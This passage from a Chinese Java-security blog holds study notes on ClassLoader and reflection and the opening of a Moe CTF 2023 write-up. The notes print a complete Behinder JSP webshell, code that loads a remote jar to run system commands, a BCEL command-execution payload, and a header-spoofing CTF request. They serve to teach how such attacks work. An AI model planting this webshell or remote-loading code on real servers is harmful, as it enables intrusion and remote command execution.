src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240716221836444.png" alt="image-20240716221836444"></p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn archetype:generate 初始化</span><br><span class="line">mvn compile 编译</span><br><span class="line">mvn test 运行测试</span><br><span class="line">mvn package 打包</span><br><span class="line">mvn install 安装到本地</span><br><span class="line">mvn deploy 部署到远程仓库</span><br><span class="line">mvn exec:java 运行</span><br><span class="line">mvn clean 清理</span><br><span class="line">mvn update 更新依赖</span><br><span class="line">mvn site 生成文档</span><br><span class="line">mvn report 生成报告</span><br></pre></td></tr></table></figure><p><strong>结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717091820638.png" alt="image-20240717091820638"></p><p><strong>Spring Boot</strong></p><p>Spring Boot 是一个开源的 Java 基础框架，它使得创建独立的、生产级的基于 Spring 框架的应用程序变得非常容易。Spring Boot 可以自动配置你的 Spring 应用程序，让你快速启动和运行 Spring 应用程序。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717100448150.png" alt="image-20240717100448150"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717100502433.png" alt="image-20240717100502433"></p><p><strong>Tomcat</strong></p><p>Tomcat 是一个开源的 Java Servlet 容器，由 Apache 软件基金会维护。它实现了 Java Servlet 和 JavaServer Pages (JSP) 技术，提供了一个运行 Java Web 应用程序的平台。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717101006239.png" alt="image-20240717101006239"></p><h3 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>Java 是Java 面向对象程序设计语言和 Java 平台的总称。</p><p>Java分为三个体系：</p><ul><li>JavaSE（J2SE）（Java2 Platform Standard Edition，java平台标准版）</li><li>JavaEE   (J2EE)     (Java 2 Platform,Enterprise Edition，java平台企业版)</li><li>JavaME  (J2ME)    (Java 2 Platform Micro Edition，java平台微型版)。</li></ul><p>Java作为一种面向对象语言。支持以下基本概念：</p><ul><li><strong>对象</strong>：对象是类的一个实例（<strong>对象不是找个女朋友</strong>），有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li><li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li></ul><h4 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a><a href="https://www.javasec.org/javase/ClassLoader/#classloader%EF%BC%88%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%EF%BC%89">ClassLoader（类加载机制）</a></h4><p>Java是一个依赖于<code>JVM</code>（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h5 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h5><p>使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">/**</span><br><span class="line"> * Creator: yz</span><br><span class="line"> * Date: 2019/12/17</span><br><span class="line"> * ReWriter: bthcls</span><br><span class="line"> * Date: 2024/7/17</span><br><span class="line"> */</span><br><span class="line">public class Main extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">    // TestHelloWorld类名</span><br><span class="line">    private static String testClassName = &quot;com.anbai.sec.classloader.TestHelloWorld&quot;;</span><br><span class="line"></span><br><span class="line">    // TestHelloWorld类字节码</span><br><span class="line">    private static byte[] testClassBytes = new byte[]&#123;</span><br><span class="line">            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">            0, 0, 0, 2, 0, 12</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        // 只处理TestHelloWorld类</span><br><span class="line">        if (name.equals(testClassName)) &#123;</span><br><span class="line">            // 调用JVM的native方法定义TestHelloWorld类</span><br><span class="line">            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建自定义的类加载器</span><br><span class="line">        Main loader = new Main();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            // 使用自定义的类加载器加载TestHelloWorld类</span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span><br><span class="line">            Object testInstance = testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            // 反射获取hello方法</span><br><span class="line">            Method method = testInstance.getClass().getMethod(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            // 反射调用hello方法,等价于 String str = t.hello();</span><br><span class="line">            String str = (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字节码到BytesToHex.class，反编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        byte[] classBytes = new byte[]&#123;</span><br><span class="line">                -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">                16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">                101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">                1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">                97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">                101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">                114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">                32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">                115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">                116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">                97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">                0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">                1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">                0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">                0, 0, 0, 2, 0, 12</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        try (FileOutputStream fos = new FileOutputStream(&quot;ByteToHex.class&quot;)) &#123;</span><br><span class="line">            fos.write(classBytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717224859489.png" alt="image-20240717224859489"></p><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象</p><p><strong>示例 - 冰蝎JSP后门：</strong></p><p>以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span><br><span class="line">        String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">        session.putValue(&quot;u&quot;, k);</span><br><span class="line">        Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h5><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p><strong>TestURLClassLoader.java示例：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ls&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程的<code>cmd.jar</code>中就一个<code>CMD.class</code>文件，对应的编译之前的代码片段如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Creator: yz</span><br><span class="line"> * <span class="built_in">Date</span>: <span class="number">2019</span>/<span class="number">12</span>/<span class="number">18</span></span><br><span class="line"> */</span><br><span class="line">public class <span class="built_in">CMD</span> &#123;</span><br><span class="line"></span><br><span class="line">    public static Process exec(String <span class="built_in">cmd</span>) throws IOException &#123;</span><br><span class="line">        return Runtime.getRuntime().exec(<span class="built_in">cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译CMD.java，打包CMD.class（这里打包错了，应该只打包CMD.class）</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717230609910.png" alt="image-20240717230609910"></p><p>放到vps，开始远程实验</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717231514315.png" alt="image-20240717231514315"></p><h5 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h5><p><a href="https://commons.apache.org/proper/commons-bcel/">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名<code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，BCEL的类加载器在解析类名时会对ClassName中有<code>$$BCEL$$</code>标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。</p><p><strong>BCEL攻击原理</strong></p><p>当BCEL的<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>加载一个类名中带有<code>$$BCEL$$</code>的类时会截取出<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。</p><p><strong>兼容性问题</strong></p><p>BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始<code>org.apache.bcel.classfile.ConstantUtf8#setBytes</code>就已经过时了，如下：</p><p>Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：<code>JDK1.5 - 1.7</code>、<code>JDK8 - JDK8u241</code>、<code>JDK9</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将一个Class文件编码成BCEL类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile Class文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 编码后的BCEL类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 文件读取异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>暂时没有jdk环境</p><p><strong>Xalan ClassLoader</strong></p><p><strong>跨类加载器加载</strong></p><p><strong>JSP类加载</strong></p><h5 id="ClassLoader总结"><a href="#ClassLoader总结" class="headerlink" title="ClassLoader总结"></a>ClassLoader总结</h5><p><code>ClassLoader</code>是JVM中一个非常重要的组成部分，<code>ClassLoader</code>可以为我们加载任意的java类，通过自定义<code>ClassLoader</code>更能够实现自定义类加载行为。</p><h4 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a><a href="https://www.javasec.org/javase/Reflection/Reflection.html">Java反射机制</a></h4><p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。</p><h5 id="不使用反射执行本地命令代码片段："><a href="#不使用反射执行本地命令代码片段：" class="headerlink" title="不使用反射执行本地命令代码片段："></a>不使用反射执行本地命令代码片段：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><p>如上可以看到，我们可以使用一行代码完成本地命令执行操作，但是如果使用反射就会比较麻烦了，我们不得不需要间接性的调用<code>Runtime</code>的<code>exec</code>方法。</p><h5 id="反射Runtime执行本地命令代码片段："><a href="#反射Runtime执行本地命令代码片段：" class="headerlink" title="反射Runtime执行本地命令代码片段："></a>反射Runtime执行本地命令代码片段：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><p>反射调用<code>Runtime</code>实现本地命令执行的流程如下：</p><ol><li>反射获取<code>Runtime</code>类对象(<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)。</li><li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li><li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)。</li><li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moe CTF 2023复现</title>
      <link href="/2024/07/13/Moe%20CTF%202023%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/13/Moe%20CTF%202023%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Moe-CTF-2023复现"><a href="#Moe-CTF-2023复现" class="headerlink" title="Moe CTF 2023复现"></a>Moe CTF 2023复现</h1><p>题目质量很高，可惜很多题目没办法赛后在这个平台复现，想看一下取证和AI题。</p><p><a href="https://ctf.xidian.edu.cn/playground">复现平台</a></p><p>题目启动&#x2F;关闭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service start/stop</span><br></pre></td></tr></table></figure><p><a href="https://forensics.xidian.edu.cn/git/CyberTerminal/WebSocketReflectorX/releases/download/wsrx-desktop-v0.1.5/WSRX.Desktop_0.1.5_x64_en-US.msi">WSRX Desktop安装包</a></p><p>在线环境题目需wss协议连接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213040514.png" alt="image-20240713213040514"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>给出了任务</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713212902129.png" alt="image-20240713212902129"></p><p>构造请求包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?UwU=u HTTP/1.1</span><br><span class="line">Host: localhost:1938</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Cookie: character=admin</span><br><span class="line">Priority: u=0, i</span><br><span class="line">User-Agent: MoeBrowser</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Luv=u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713212932145.png" alt="image-20240713212932145"></p><h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>新手指南pdf，最后给了一串字符串，hex+Base64解码，指导方式很不错的新生赛题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213558070.png" alt="image-20240713213558070"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240713213613016.png" alt="image-20240713213613016"></p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p><a 